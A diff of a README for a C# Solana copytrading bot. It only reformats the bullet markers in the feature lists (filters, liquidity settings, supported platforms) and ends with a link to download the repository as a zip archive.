@@ -9,17 +9,17 @@ A powerful and customizable copytrading bot built in **C#** for the **Solana blo
 
 -  **Customizable Filters**  
   Fine-tune what types of transactions to follow:
-  - Swaps
-  - Transfers
-  - NFT activity
-  - Token launches
-  - Liquidity events
+  -- Swaps
+  -- Transfers
+  -- NFT activity
+  -- Token launches
+  -- Liquidity events
 
 -  **Liquidity Management**  
   Manage how your liquidity is used:
-  - Auto-adjust based on wallet activity
-  - Slippage controls
-  - Minimum liquidity thresholds
+  -- Auto-adjust based on wallet activity
+  -- Slippage controls
+  -- Minimum liquidity thresholds
 
 -  **Token Creation Detection**  
   Detect new token launches and participate based on configurable triggers.
@@ -32,13 +32,13 @@ A powerful and customizable copytrading bot built in **C#** for the **Solana blo
 
 -  **Platform Integration**
   Seamlessly supports multiple Solana-based DEX and trading tools:
-  - Raydium
-  - pump.fun
-  - Moonshot
-  - Photon
-  - GMGN
-  - BonkBot
-  - Banana Gun
+  -- Raydium
+  -- pump.fun
+  -- Moonshot
+  -- Photon
+  -- GMGN
+  -- BonkBot
+  -- Banana Gun
 
 ## Getting Started
 - [Clone](https://github.com/knightlightst/solana-copytrading-bot/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
